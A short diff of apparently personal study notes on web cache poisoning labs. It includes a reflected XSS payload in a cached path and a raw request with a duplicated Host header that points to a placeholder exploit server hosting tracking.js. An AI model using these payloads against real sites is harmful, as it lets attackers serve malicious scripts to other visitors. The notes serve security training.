@@ -108,3 +108,11 @@ GET /random</p><script>alert(1)</script><p>foo
 ``
 
 Cache this path and then deliver URL to the victim
+
+## tracking.js + double Host:
+
+```
+GET /?cb=123 HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
